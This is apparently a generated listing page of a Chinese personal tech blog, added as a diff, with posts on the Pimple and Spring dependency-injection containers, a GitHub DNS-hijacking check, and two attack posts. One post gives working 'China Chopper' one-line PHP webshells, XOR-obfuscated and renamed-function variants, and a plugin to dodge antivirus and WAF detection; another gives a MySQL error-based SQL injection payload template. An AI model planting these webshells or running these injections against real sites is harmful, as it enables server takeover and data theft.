@@ -1,0 +1,688 @@
+<html>
+  <head>
+
+        <script type="text/javascript">
+          var wsUri = "ws://localhost:8080/websocket";
+      function init()
+      {
+        websocket = new WebSocket(wsUri);
+        websocket.onclose = function(evt) { onClose(evt) };
+      }
+      function onClose(evt)
+      {
+        console.log('closing');
+        websocket.close();
+        document.location.reload();
+      }
+      window.addEventListener("load", init, false);
+      </script>
+            <meta charSet="utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1"/>
+    <title>
+      Sample Fornax blog
+    </title>
+    <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.png"/>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"/>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans"/>
+    <link rel="stylesheet" href="https://unpkg.com/bulma@0.8.0/css/bulma.min.css"/>
+    <link rel="stylesheet" type="text/css" href="/style/style.css"/>
+  </head>
+  <body>
+    <nav class="navbar">
+      <div class="container">
+        <div class="navbar-brand">
+          <a class="navbar-item" href="/">
+            <img src="/images/bulma.png" alt="Logo"/>
+          </a>
+          <span class="navbar-burger burger" data-target="navbarMenu">
+            <span></span>
+            <span></span>
+            <span></span>
+          </span>
+        </div>
+        <div id="navbarMenu" class="navbar-menu">
+          <a class="navbar-item is-active" href="/">
+            Home
+          </a>
+          <a class="navbar-item" href="/about.html">
+            About
+          </a>
+          <a class="navbar-item" href="/contact.html">
+            Contact
+          </a>
+        </div>
+      </div>
+    </nav>
+    <section class="hero is-info is-medium is-bold">
+      <div class="hero-body">
+        <div class="container has-text-centered">
+          <h1 class="title">
+            Lorem ipsum dolor sit amet, consectetur adipiscing elit
+          </h1>
+        </div>
+      </div>
+    </section>
+    <div class="container">
+      <section class="articles">
+        <div class="column is-8 is-offset-2">
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/WindWhisper/PHP/Misc/Pimple.html">
+                    Pimple
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-09-19
+                </p>
+              </div>
+              <div class="content article-body">
+                <h2>Why Pimple</h2>
+<p>最近在倒腾WordPress，在github选择了一个四百多关注的微信框架项目，结果发现bug不断，好不容易通读源码后改好了BUG又发现扩展性太差，
+而且各类之间代码耦合严重，于是打算动手写一个自己的微框架(重复造轮子)，想实现这样的目标：</p>
+<ol>
+<li>独立于任何框架、整站程序</li>
+<li>不要依赖于外部PHP扩展，可以运行在低端空间之上。</li>
+<li>良好的组织性</li>
+<li>良好的可扩展性</li>
+</ol>
+<p>不可避免的遇到了依赖注入问题，起初想直接用Symfony/DependencyInjection组件，但是写着写着就发现这个组件太啰嗦了。
+于是决定学习以下著名的Pimpler容器。</p>
+<p>不得不说这玩意儿实在是小巧精致！</p>
+<h2>Pimple用法</h2>
+<p>下面翻译自官方文档：</p>
+<p>创建一个容器：</p>
+<pre><code class="language-PHP">use Pimple\Container;
+
+$container = new Container();
+</code></pre>
+<p>和众多其他的DI容器一样，Pimple主要管理两类数据：<code>服务</code>和<code>参数</code>。</p>
+<h3>定义Services</h3>
+<p>服务是通过可以返回一个实例对象的匿名函数来定义的：</p>
+<pre><code class="language-PHP">// define some services
+$container['session_storage'] = function ($c) {
+    return new SessionStorage('SESSION_ID');
+};
+
+$container['session'] = function ($c) {
+    return new Session($c['session_storage']);
+};
+</code></pre>
+<p>注意此匿名函数可以访问当前容器对象实例,允许对其他<code>服务</code>或者<code>参赛</code>进行引用。
+对象只有当你需要获取它们的时候才被创建，定义的顺序是无关紧要的。</p>
+<p>使用已定义的服务同样非常简单：</p>
+<pre><code class="language-PHP">// get the session object
+$session = $container['session'];
+
+// the above call is roughly equivalent to the following code:
+// $storage = new SessionStorage('SESSION_ID');
+// $session = new Session($storage);
+</code></pre>
+<h3>定义工厂服务</h3>
+<p>默认情况下，你每一次获取<code>服务</code>,Pimple返回它的同一个实例。如果你想要它每次返回不同的实例,用<code>factory()</code>方法包装你的匿名函数即可：</p>
+<pre><code class="language-PHP">$container['session'] = $container-&gt;factory(function ($c) {
+    return new Session($c['session_storage']);
+});
+</code></pre>
+<p>这样，每一次调用 <code>$container['session']</code>都会返回一个新的session实例。</p>
+<h3>定义参数</h3>
+<p>定义一个<code>参数</code>，可以轻松从外部配置我们的容器，还可以存储全局变量。</p>
+<pre><code class="language-PHP">// define some parameters
+$container['cookie_name'] = 'SESSION_ID';
+$container['session_storage_class'] = 'SessionStorage';
+</code></pre>
+<p>如果你像下面这样改变<code>session_storage</code>服务的定义 :</p>
+<pre><code class="language-PHP">$container['session_storage'] = function ($c) {
+    return new $c['session_storage_class']($c['cookie_name']);
+};
+</code></pre>
+<p>就可以通过覆写<code>session_storage</code>的参数(而不是重新定义服务)轻松改变cookie name。</p>
+<h3>Protecting Parameters</h3>
+<p>由于Pimple把匿名函数视作服务定义，你需要用<code>protect()</code>包装你的匿名函数以把他们存储为<code>parameters</code>:：</p>
+<pre><code class="language-PHP">$container['random_func'] = $container-&gt;protect(function () {
+    return rand();
+});
+</code></pre>
+<h3>修改Services</h3>
+<p>有一些情况下，你也许想在一个服务定义完成之后再进行修改。这可以用<code>extend</code>实现。</p>
+<pre><code>$container['session_storage'] = function ($c) {
+    return new $c['session_storage_class']($c['cookie_name']);
+};
+
+$container-&gt;extend('session_storage', function ($storage, $c) {
+    $storage-&gt;...();
+
+    return $storage;
+});
+</code></pre>
+<p>The first argument is the name of the service to extend, the second a function that gets access to the object instance and the container.</p>
+<h3>Extending a Container¶</h3>
+<p>If you use the same libraries over and over, you might want to reuse some services from one project to the next one;
+package your services into a provider by implementing Pimple\ServiceProviderInterface:</p>
+<pre><code class="language-PHP">use Pimple\Container;
+
+class FooProvider implements Pimple\ServiceProviderInterface
+{
+    public function register(Container $pimple)
+    {
+        // register some services and parameters
+        // on $pimple
+    }
+}
+</code></pre>
+<p>Then, register the provider on a Container:</p>
+<pre><code class="language-PHP">$pimple-&gt;register(new FooProvider());
+</code></pre>
+<h3>获取服务创建函数</h3>
+<p>When you access an object, Pimple automatically calls the anonymous function that you defined,
+which creates the service object for you.
+If you want to get raw access to this function, you can use the raw() method:</p>
+<pre><code class="language-PHP">
+$container['session'] = function ($c) {
+    return new Session($c['session_storage']);
+};
+
+$sessionFunction = $container-&gt;raw('session');
+</code></pre>
+<h2>Pimple的核心原理</h2>
+<p>其实就是类数组操作而已。</p>
+
+              </div>
+            </div>
+          </div>
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/Misc/Github-and-DNS-Hijacking-by-Somebody.html">
+                    Github and DNS Hijacking by Somebody
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-08-14
+                </p>
+              </div>
+              <div class="content article-body">
+                <h2>柏林墙</h2>
+<p>这几日github整个都访问不了了，恰好我刚换了win10，起初还以为是git版本不兼容。后来才发现原来和我的本地机器无关。</p>
+<p>虽说以前github在我们大陆人看来会间歇性抽风，但是从最近这几天的情况看来，github于我所在的地区而言，似乎彻底挂了。</p>
+<p>终于,在今天晚上我找到了一点空闲时间，决定一探究竟。</p>
+<h2>DNS Hijacking</h2>
+<p>注意到firefox访问github.com时总是先提示</p>
+<p><code>looking up github.com...</code></p>
+<p>然后在漫长的等待后提示timeout，于是初步认定DNS环节出了问题，分别调用：</p>
+<pre><code class="language-.bash">dig github.com @8.8.8.8 
+dig github.com @8.8.8.8 +tcp
+</code></pre>
+<p>得到这样一张图：
+{% asset_img &quot;github_dig_github1.png&quot; &quot;github的DNS查询结果&quot; %}</p>
+<p>熟悉的配方，熟悉的味道。我闻到了阵阵恶心的味道，于是我打算暂停手头的工作，去吃点西瓜压压惊。</p>
+<p>二十分钟后，我又进行了一次DNS查询(UDP)：</p>
+<p>{% asset_img &quot;github_dig_github2.png&quot; &quot;第二次通过UDP协议查询github的IP地址&quot; %}</p>
+<p>至于这两个捕获到的IP地址：<code>203.208.39.104</code>、<code>66.249.89.104</code>,我whois了一下：</p>
+<p>{% asset_img &quot;github_whois_203.208.39.104.png&quot; &quot;203.208.39.104&quot;  %}</p>
+<p>{% asset_img &quot;github_whois_66.249.89.104.png&quot; &quot;66.249.89.104&quot;  %}</p>
+<p>我想上个github，结果某人告诉我要去google家的服务器找。</p>
+<p>我又得去吃西瓜降降火了。</p>
+<h1>解决办法</h1>
+<p>不搭梯子的方法很简单，修改本地hosts文件，让计算机知道正确的IP地址即可。</p>
+
+              </div>
+            </div>
+          </div>
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/WitchCraft/Spy/经典菜刀一句话小马及其变形的设计.html">
+                    经典菜刀一句话小马及其变形的设计
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-07-26
+                </p>
+              </div>
+              <div class="content article-body">
+                <p>经典的菜刀一句话类似于：</p>
+<pre><code class="language-PHP">@eval($_POST['pass'])
+</code></pre>
+<p>这里的eval便是我们要执行的动作。而真正要执行的代码以字符串形式存在的$_POST['pass']。</p>
+<p>这类小马总是接受来自客户端的发来的Request，然后对其中特定的邪恶字符串动态求值，并将执行结果以特定的格式Response回客户端。一句话小马的核心特征总是可以归结为这样的形式：</p>
+<pre><code class="language-PHP">$act（$evilStr）
+</code></pre>
+<p>其中，$act可能代表eval、system，或如带e标志的preg_replace之类可执行字符串的动作，$evilStr代表一段以字符串形式存在的邪恶代码。</p>
+<h2>动作</h2>
+<p>在服务端的木马中直接写eval之类的敏感词很可能会导致被查杀。有两种基本思路可以绕过这个问题：</p>
+<ul>
+<li>在服务端的小马里对动作名进行混淆</li>
+<li>从客户端向小马传递动作名，从而避免在服务端的小马里看到eval之类的代码</li>
+</ul>
+<h3>混淆动作名</h3>
+<p>混淆动作名的方法很多，如字符串拼接、base64编码等等。关键是隐藏自己。</p>
+<h3>从客户端传递动作名：</h3>
+<p>木马类似于：</p>
+<pre><code class="language-PHP">$act=$_GET['act'];
+$evilStr=$_POST['evilStr'];
+$act($evilStr);
+</code></pre>
+<p>则客户端POST恶意数据到victim.php?act=eval即可完成。</p>
+<h3>结合两者：</h3>
+<p>比如QuasiBot的服务端木马：</p>
+<pre><code class="language-PHP">if($_GET['_']) {
+    print &quot;&lt;!--&quot;.$_=&quot;{:|&quot;;
+    $_=($_^&quot;&lt;&quot;).($_^&quot;&gt;&quot;).($_^&quot;/&quot;); # 结果为$_=&quot;GET&quot;
+    ${'_'.$_}[&quot;_&quot;](${'_'.$_}[&quot;__&quot;]);    #结果为$_GET['_']($_GET['__'])
+    print &quot;{:|&quot;.md5(&quot;666&quot;.date(&quot;h:d&quot;)).&quot;{:|&quot;.PHP_OS.&quot;{:|--&gt;&quot;;
+}else{
+    //...
+}
+</code></pre>
+<p>很显然，这段代码实际上是利用异或^运算符做了代码混淆，本质上还是通过客户端传递动作名来达到隐蔽自己的效果。</p>
+<h2>邪恶代码的字符串</h2>
+<p>这部分便是我们实际要运行的代码。由于WAF的缘故，经常需要对之进行编码加密，常用的便是利用base64_decode()。
+解密工作可以放到服务端的小马中完成，也可以放在邪恶字符串中——每当邪恶字符串被求值的时候，就会触发自解密。
+比如菜刀的某一段邪恶功能字符串经过整理后可能类似于：</p>
+<pre><code class="language-C#">//ee=
+Response.Write(&quot;-&gt;|&quot;);
+var err:Exception;
+try{
+    eval(
+        System.Text.Encoding.GetEncoding(65001).GetString(
+            System.Convert.FromBase64String(&quot;dmFyIFA9U3lzdGVtLlRleHQuRW5jb2RpbmcuR2V0RW5jb2RpbmcoNjUwMDEpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiejEiXSkpO3ZhciBtPW5ldyBTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyKFAsRW5jb2RpbmcuRGVmYXVsdCk7UmVzcG9uc2UuV3JpdGUobS5SZWFkVG9FbmQoKSk7bS5DbG9zZSgpOw%3D%3D&quot;)
+        ),
+        &quot;unsafe&quot;
+    );
+}catch(err){
+    Response.Write(&quot;ERROR:// &quot;%2Berr.message);
+}
+Response.Write(&quot;|&lt;-&quot;);
+Response.End();
+</code></pre>
+<p>配合着发送的还有这样一个QueryString</p>
+<pre><code class="language-C#">z1=QzpcXERvY3VtZW50cyBhbmQgU2V0dGluZ3NcXEFkbWluaXN0cmF0b3JcXOahjOmdolxcMjIyLmNzdg%3D%3D
+</code></pre>
+<p>其中：</p>
+<ul>
+<li>ee代表的邪恶字符串经过urldecode、base64_decode之后，得到明文是:</li>
+</ul>
+<pre><code class="language-C#">var P=System.Text.Encoding.GetEncoding(65001).GetString(
+    System.Convert.FromBase64String(Request.Item[&quot;z1&quot;])
+);
+var m=new System.IO.StreamReader(P,Encoding.Default);
+Response.Write(m.ReadToEnd());
+m.Close();
+</code></pre>
+<ul>
+<li>z1实际上是一段经过base64编码的字符串，用作ee代表的那段邪恶代码的变量。</li>
+</ul>
+<p>当然，这样直接把eval和base_decode这类敏感词写到邪恶字符串中，还是带有一定的通信特征，很容易被查杀，所以习科核心成员<a href="http://bbs.isilic.org/space-uid-5744.html">半块西瓜皮</a>发布了<a href="http://bbs.isilic.org/forum.php?mod=viewthread&amp;tid=6972&amp;highlight=%E8%8F%9C%E5%88%80">Python插件版的菜刀</a>，支持把eval、base_decode之类的敏感词替换为其他非敏感字符串，然后再在服务端的小马中予以还原。</p>
+<p>Python的插件脚本为：</p>
+<pre><code class="language-Python">def makepostdata(headers,postdata):
+    open('headers.txt','wb').write(headers)
+    open('postdata.txt','wb').write(postdata)
+    headers = headers.replace('X-Forwarded-For','asdasd')
+    postdata = postdata.replace('eval','xxxx')
+    postdata = postdata.replace('base64_decode','yyyy')
+    return headers,postdata
+</code></pre>
+<p>这个插件作者给出的服务端的小马类似于：</p>
+<pre><code class="language-PHP">&lt;?php
+    function xxxx($str){return eval($str);}
+    function yyyy($str){return base64_decode($str);}
+    xxxx($_POST['pass']);
+?&gt;
+</code></pre>
+<p>当然，这种服务端小马尚未对敏感词做混淆，可以配合异或符进一步隐蔽。</p>
+
+              </div>
+            </div>
+          </div>
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/WindWhisper/Java/spring/Ioc Java Spring.html">
+                    IoC ，以 Spring 为例
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-05-31
+                </p>
+              </div>
+              <div class="content article-body">
+                <h2>IoC的核心理念</h2>
+<p>IoC的核心理念在于分离这两种职责：</p>
+<ol>
+<li>类对象的依赖解析（即：生成或者查找过程）</li>
+<li>类对象的使用</li>
+</ol>
+<p>具体而言，就是把各个类对象实例的依赖解析过程统一交给容器负责，类的使用者只负责使用类对象，不再去承担类实例的创建、查找职责（即不再去控制依赖解析过程），从而实现了控制反转（IoC），也就是传说中的好莱坞法则：“别打电话给我，我会打给你”的意义：“别自己生成对象，我会替你生成”。</p>
+<p>要生成一个类，如果不考虑工厂方法，传统的做法总是类似于：</p>
+<pre><code class="language-Java">MyClass mc=new MyClass(1,&quot;hello,world&quot;,true);
+
+</code></pre>
+<p>如果我们丢开这些语法形式，可以发现，通过new生成新对象实际上提供了两个基本信息：</p>
+<ol>
+<li>类名</li>
+<li>构造器参数</li>
+</ol>
+<p>如果把这些信息写入到配置文件中，然后在主程序中读取配置，就可以利用反射技术动态生成这些类的实例。</p>
+<p>比如,现有若干个Java类，其中一个POJO类如下所示：</p>
+<pre><code class="language-Java">package com.mycompany.mavenproject1;
+
+public class MyBean {
+    private int a;
+    private String b;
+
+    public MyBean(int a,String b){
+        this.a=a;
+        this.b=b;
+    }
+
+    /**
+        * @return the a
+        */
+    public int getA() {
+        return a;
+    }
+
+    /**
+        * @param a the a to set
+        */
+    public void setA(int a) {
+        this.a = a;
+    }
+
+    /**
+        * @return the b
+        */
+    public String getB() {
+        return b;
+    }
+
+    /**
+        * @param b the b to set
+        */
+    public void setB(String b) {
+        this.b = b;
+    }
+	
+}
+
+</code></pre>
+<p>将其信息写入配置文件，随便其一个名字，比如叫<code>config.xml</code></p>
+<pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.2.xsd &quot;
+&gt;
+
+    &lt;bean id=&quot;myBean&quot; class=&quot;com.mycompany.mavenproject1.MyBean&quot;&gt;
+        &lt;constructor-arg name=&quot;a&quot; value=&quot;2&quot;/&gt;
+        &lt;constructor-arg name=&quot;b&quot; value=&quot;Hello,world&quot;/&gt;
+    &lt;/bean &gt;
+
+    &lt;!--其他bean的配置信息 --&gt;
+&lt;/beans&gt;
+</code></pre>
+<p>读取配置，这样我们就很容易利用反射创建相应的类:</p>
+<pre><code class="language-Java">	    
+public static void main(String[] args) throws ClassNotFoundException {
+
+    String myBeanClassName=&quot;&quot;;
+    int myBeanConstructorA;
+    String myBeanConstructorB;
+
+    //...
+    //...从配置文件中读取myBean类名称：&quot;com.mycompany.mavenproject1.MyBean&quot;;
+    //...从配置文件中读取myBean类构造器参数a;	
+    //...从配置文件中读取myBean类构造器参数b;	
+    //...
+    Class c=Class.forName(myBeanClassName);
+    MyBean myBean;
+    try {
+        myBean = (MyBean) c.getConstructor(Integer.TYPE,String.class).newInstance(myBeanConstructorA,myBeanConstructorB);
+        System.out.println(myBean.getA());
+    } catch (InstantiationException ex) {
+        //....	 
+    }
+    //...
+}
+	
+</code></pre>
+<p>由于这里读配置、并根据相关信息进行实例化是个非常普遍的过程，可以将之封装。为了不重复造轮子，利用Maven添加spring-context依赖：</p>
+<pre><code class="language-XML">    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;org.springframework&lt;/groupId&gt;
+            &lt;artifactId&gt;spring-context&lt;/artifactId&gt;
+            &lt;version&gt;4.2.4.RELEASE&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<p>即可使用如下的方式获取对象:</p>
+<pre><code class="language-Java">import org.springframework.context.ApplicationContext;
+import org.springframework.context.support.FileSystemXmlApplicationContext;
+
+/**
+ *
+ * @author snp
+ */
+public class Main {
+
+    public static void main(String[] args) {
+        ApplicationContext ctx=new FileSystemXmlApplicationContext(&quot;config.xml&quot;);
+        MyBean myBean;
+        myBean = (MyBean) ctx.getBean(MyBean.class);
+        System.out.println(myBean.getA());
+        System.out.println(myBean.getB());
+    }
+}
+</code></pre>
+<h2>Spring IoC容器的XML-based的配置</h2>
+<p>从上面可以看到，只需要在XML中提供配置，就可以通过反射技术由容器自动创建对应的类，完成相应的依赖解析。</p>
+<h3>constructor注入与静态方法注入</h3>
+<p>基于XML的配置类似于：</p>
+<pre><code class="language-XML">&lt;bean id=&quot;sss&quot; class=&quot;SSS&quot;&gt;&lt;/bean&gt;
+&lt;bean id=&quot;xxx&quot; class=&quot;XXX&quot;&gt;
+    &lt;constructor-arg value=&quot;15&quot;/&gt;    &lt;!--构造器注入：基本类型的参数--&gt;
+    &lt;constructor-arg ref=&quot;sss&quot;/&gt;     &lt;!--构造器注入：引用类型的参数--&gt;
+&lt;/bean&gt;
+&lt;bean id=&quot;yyy&quot; class=&quot;YYY&quot; factory-method=&quot;getInstance&quot;/&gt;   &lt;!--通过静态方法构建--&gt;
+</code></pre>
+<p>Spring Bean默认为单例，当容器分配一个Bean时，总是返回该Bean类的同一个实例。如何修改这种默认特性呢？可以为Bean声明一个作用域：</p>
+<pre><code class="language-XML">&lt;bean id=&quot;zzz&quot; class=&quot;ZZZ&quot; scope=&quot;prototype&quot;&gt;&lt;/bean&gt;
+</code></pre>
+<p>常见的作用域包括：</p>
+<ul>
+<li>prototype        #每次都是新的</li>
+<li>singleton       #默认</li>
+<li>request           #每次HTTP Request都产生新的</li>
+<li>session            #每次HTTP Session都产生新的</li>
+<li>global-session</li>
+</ul>
+<h3>setter注入</h3>
+<p>基于XML的配置类似于：</p>
+<pre><code class="language-XML">&lt;bean id=&quot;sss&quot; class=&quot;SSS&quot;&gt;
+    &lt;property name=&quot;x&quot; value=&quot;Jingle Bells&quot;/&gt;
+    &lt;property name=&quot;y&quot; ref=&quot;yId&quot;/&gt;
+&lt;/bean&gt;
+</code></pre>
+<h2>Spring IoC容器的Java-based的配置</h2>
+<p>使用XML是一种比较传统的做法，但是缺点也很明显：</p>
+<ul>
+<li>啰嗦</li>
+<li>非类型安全的：如果手误打错一个字符串，可能要到运行时才能发现</li>
+</ul>
+<p>为了利用静态语言类型安全的优势，基于Java注解的配置方式被发明了出来。</p>
+<p>既然IoC核心在于将依赖解析这个职责分离出去，我们大可以向容器提供基于Java的配置，用以直接调用new来生成相应的类对象（Bean）：</p>
+<pre><code class="language-Java">@Configuration
+class MyJavaConfig
+{
+    @Bean
+    public MyBean1 myBean1(){
+        return new MyBean1();
+    }
+    
+    //...
+}
+</code></pre>
+<p>如此，同样达到了控制反转、分离依赖解析职责的目的。</p>
+<p>由于这种每一个Bean都需要手工显式声明Bean的方式很麻烦，对此Spring提供了auto wiring机制：</p>
+<ul>
+<li>组件的自动扫描</li>
+<li>组件的自动装配</li>
+</ul>
+<p>当然，Spring允许混搭风格的配置，你完全可以杂糅XML-based的配置、Java-based的配置和显式声明Bean与隐式声明Bean（让Spring自动查找及装配）多种配置方式。</p>
+<h3>组件的注解</h3>
+<p>Spring默认提供了以下4种注解将POJO声明为组件：</p>
+<ul>
+<li><code>@Component</code>：通用的构造型注解，标识该类为Spring组件</li>
+<li><code>@Controller</code>：标识该类为Spring MVC controller</li>
+<li><code>@Repository</code>：标识该类为数据仓库</li>
+<li><code>@Service</code>：标识该类为服务</li>
+</ul>
+<p>当需要声明由容器自动进行装配时，应用<code>@Autowired</code>注解之。</p>
+<p>JSR-330中提供了</p>
+<ul>
+<li><code>@Named</code>作为标准的组件注解。</li>
+<li><code>@Inject</code>作为标准的注入注解</li>
+</ul>
+<p>一般而言，特定的组件Bean应以<code>@Component</code>（或者标准的<code>@Named</code>）注解之。当该组件不是单例模式时，应以<code>@Scope</code>注解之。需要注入的地方应以<code>@Autowired</code>（或者标准的<code>@Inject</code>）注解之。</p>
+<h3>配置类的注解</h3>
+<p>配置类可以使用</p>
+<ul>
+<li><code>@Configuration</code> 来表示这是一个基于注解的配置类</li>
+<li><code>@ComponentScan</code> 来表示让Spring去自动扫描合适的组件</li>
+<li><code>@Import</code> 表示需要从其他JavaConfig中导入配置</li>
+<li><code>@ImportResource</code> 表示要从XML文件中导入配置</li>
+</ul>
+<p>对于部分要要显式声明的Bean，应在配置类的相关方法使用<code>@Bean</code>注解之。</p>
+<p>最后，基于Java注解配置的ApplicationContext应该如此获取：</p>
+<pre><code class="language-Java">ApplicationContext context=new AnnotationConfigApplicationContext(KnightConfig.class);
+</code></pre>
+<p>这种基于Java注解的Java配置类效果类似于以下的XML文件：</p>
+<pre><code class="language-XML">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
+    xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+    xmlns:aop=&quot;http://www.springframework.org/schema/aop&quot;
+    xmlns:context=&quot;http://www.springframework.org/schema/context&quot;
+
+    xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.2.xsd
+        http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.2.xsd
+        http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.2.xsd&quot;
+&gt;
+    &lt;context:annotation-config/&gt;
+    &lt;context:component-scan  base-package=&quot;testannotationinject.instrument&quot; &gt;&lt;/context:component-scan&gt;
+    &lt;context:component-scan  base-package=&quot;testannotationinject.performer&quot; &gt;&lt;/context:component-scan&gt;
+    &lt;context:component-scan  base-package=&quot;testannotationinject.performer.instrumentalist&quot; &gt;&lt;/context:component-scan&gt;
+    &lt;context:component-scan  base-package=&quot;testannotationinject.performer.juggler&quot; &gt;&lt;/context:component-scan&gt;
+
+&lt;/beans&gt;
+</code></pre>
+<p>其中：</p>
+<ul>
+<li><code>&lt;context:annotation-config/&gt;</code>用于告诉Spring使用注解配置</li>
+<li><code>&lt;context:component-scan&gt;</code>用于通知Spring自动扫描base-package，对使用构造型(<code>stereotype</code>)标注的类会自动注册为Bean。</li>
+</ul>
+<p>当然，类似于Java配置类获取容器的方式，利用XML格式的配置文件生成容器的方式为：</p>
+<pre><code class="language-Java">ApplicationContext context=new FileSystemXmlApplicationContext(KnightConfig.class);
+</code></pre>
+
+              </div>
+            </div>
+          </div>
+          <div class="card article">
+            <div class="card-content">
+              <div class="media-content has-text-centered">
+                <p class="title article-title">
+                  <a href="/posts/WitchCraft/SQL Injection/MySQL注入-重复条目报错回显公式.html">
+                    MySQL注入-重复条目报错回显公式
+                  </a>
+                </p>
+                <p class="subtitle is-6 article-subtitle">
+                  <a href="#">
+                    
+                  </a>
+                  on 2015-04-16
+                </p>
+              </div>
+              <div class="content article-body">
+                <p>网上对于DuplicateEntry报错回显注入公式一般是如下的形式</p>
+<pre><code class="language-SQL">1' and 1=2 union select 1 from (select count(*),concat(floor(rand(0)*2),(单值式爆破语句))a from information_schema.tables group by a)b#
+</code></pre>
+<p>注入后数据库最终执行的语句类似以下格式：</p>
+<pre><code class="language-SQL">SELECT ... 
+FROM ... 
+WHERE id= '1' and 1=2
+UNION
+SELECT 1
+FROM (
+    SELECT 
+        COUNT(*),
+        CONCAT(
+            FLOOR(RAND(0)*2),
+            ( 单值式注入语句 ) 
+        )a  
+    FROM information_schema.tables  
+    GROUP BY a 
+) b--
+</code></pre>
+<p>这个公式有3个要点</p>
+<ol>
+<li>构造布尔断路引发的并联查询，目的是断路掉前面的查询，把查询流程完全引导到并联查询（union）语句中离去。payload为：
+a' and 1=2 union select</li>
+<li>嵌套优先报错的from子查询：由于并联查询(union)要求前后的列数目一致，需要把先执行的子查询中的duplicate entry错误抢在union select的列数不一致错误之前触发。这样列数多少就无关紧要了——因为代码永远不会执行到那就提前报错了。攻击载荷结构为: uinon
+select 1 from ( 会产生duplicate entry的子查询语句 )b -- 。这里MySQL要求派生表必须提供别名（&quot;Every derived table must have its own alias&quot;），否则报错</li>
+<li>构造产生duplicate entry错误的查询。</li>
+</ol>
+<p>为什么会产生Duplicate entry错误呢？</p>
+<p>知乎上<a href="http://www.zhihu.com/question/21031129">路西法同学对Duplicate entry的产生原因</a>分析非常清晰。根据MySQL手册，rand()不可以作为ORDER BY的条件字段， 同理也不可以为group by的。上面这个mysql的bug的主要问题是获取的值不确定又可重复。同时又要来操作结果。值得注意的是，如果没有重新刷一次结果（例子中用的是count(<em>)来统计结果），单纯以rand制造会重复的不确定数也是没有效果的，如去掉count(</em>),那么也不会报错 ，所以使用left(rand(),3)之类的也是可以的（会产生会重复不确定的数）
+整理这段注入代码的构造思路如下：</p>
+<pre><code class="language-SQL">...
+WHERE id= '1' and 1=2
+UNION
+SELECT 1
+FROM (
+    SELECT 
+        COUNT(*),    ##刷新
+        CONCAT(      ##制造具有随机名称的字段
+            FLOOR(RAND(0)*2),    ##制造随机数
+            ( 单值式注入语句 )   ##真正需要执行的SQL指令，必须是单值式SQL命令
+        )a           ##为制造出来的随机字段创建别名
+    FROM information_schema.tables  
+    GROUP BY a       ##利用制造出来的随机字段分组
+) b--                ##MySQL要求派生表必须提供别名
+</code></pre>
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+    </div>
+    <div class="container">
+      <div class="container has-text-centered">
+        <a href="/posts/page24.html">
+          Previous
+        </a>
+        26 of 32
+        <a href="/posts/page26.html">
+          Next
+        </a>
+      </div>
+    </div>
+  </body>
+</html>
